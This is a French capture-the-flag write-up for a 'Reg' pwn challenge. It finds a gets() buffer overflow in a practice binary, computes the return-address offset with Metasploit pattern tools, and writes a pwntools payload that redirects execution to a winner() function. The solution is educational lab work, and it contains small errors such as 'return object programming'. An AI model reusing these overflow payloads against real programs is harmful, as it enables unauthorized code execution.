# Reg [Pwn] Challenge

**— File type —**

`file reg` 

![Untitled](Reg%20%5BPwn%5D%20Challenge%20ec6b775a0d2944a2aecf108c5cfe1423/Untitled.png)

C’est un ELF 54 bit 

gdb `checksec` pour vérifier les sécurité du programme :

![Untitled](Reg%20%5BPwn%5D%20Challenge%20ec6b775a0d2944a2aecf108c5cfe1423/Untitled%201.png)

NX est activé ce qui ne nous permet pas d’exécuté du code depuis le registre. Nous allons donc devoir faire du ROP return object programming et basculé d’un retour à un autre pour déclencher une autre fonction.

**— Le programme —**

Basique nous pouvons envoyer  un message et le programme se termine.

![Untitled](Reg%20%5BPwn%5D%20Challenge%20ec6b775a0d2944a2aecf108c5cfe1423/Untitled%202.png)

Dans ghidra nous pouvons voir le code de reg :

![Untitled](Reg%20%5BPwn%5D%20Challenge%20ec6b775a0d2944a2aecf108c5cfe1423/Untitled%203.png)

On à un gets qui est sensible à l’exploitation de binaire. Le programme n’est pas sensible à l’injection de strings comme “%p”.

En autre fonction nous avons winner qui va nous écrire le flag et qui n’a pas de vulnérabilité.

![Untitled](Reg%20%5BPwn%5D%20Challenge%20ec6b775a0d2944a2aecf108c5cfe1423/Untitled%204.png)

**— Exploitation —**

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200 > pattern.txt
```

`gdb` → run

et mettre le payload pattern.txt :

`Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag`

dans RBP nous avons ce résultat 

![Untitled](Reg%20%5BPwn%5D%20Challenge%20ec6b775a0d2944a2aecf108c5cfe1423/Untitled%205.png)

`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6241376241366241`

nous avons en offset 48 pour RBP nous ajoutons la taille de RSP et nous obtenons 56 en offset.

**— Création du payload —**

`info functions` dans gdb nous permet de voir toutes les fonctions et leurs adresses.

Nous prenons l’adresse de la fonction winner() = 0x0000000000401206.

Nous allons utilisé python pour créé ce payload :

`python -c "import pwn; print(b'a'*56 + pwn.p64(0x0000000000401206))" > input.txt`

on invoque python on demande la librairie pwntool et dans le print on complète le stack avec 56 a et ensuite nous demandons de passer à la fonction winner nous mettons finalement le payload dans un fichier texte.

Sinon `python -c 'print("a"*56 + "\x06\x12@\x00\x00\x00\x00\x00")' > input.txt` ici nous avons directement l’adresse en raw.

pour essayer le challenge nous pouvons créé un flag.txt sur notre machine et rentrer la commande `cat input.txt | ./reg`

et nous obtenons notre fake flag nous pouvons le faire sur le serveur fournit ensuite

`cat input.txt | nc ip port`